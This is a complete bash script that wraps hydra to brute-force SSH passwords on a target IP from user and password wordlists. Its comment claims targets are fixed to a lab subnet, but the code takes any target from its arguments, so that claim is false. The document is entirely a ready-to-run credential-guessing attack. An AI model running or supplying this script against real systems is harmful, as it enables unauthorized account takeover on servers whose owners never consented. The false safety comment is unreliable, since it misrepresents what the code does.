#!/bin/bash
# LAB USE ONLY - targets fixed to 192.168.10.0/24
# Usage: ./ssh-brute-force.sh <target_ip> <userlist> <passlist>
TARGET="$1"
USERS="$2"
PASS="$3"
hydra -L "$USERS" -P "$PASS" ssh://"$TARGET"
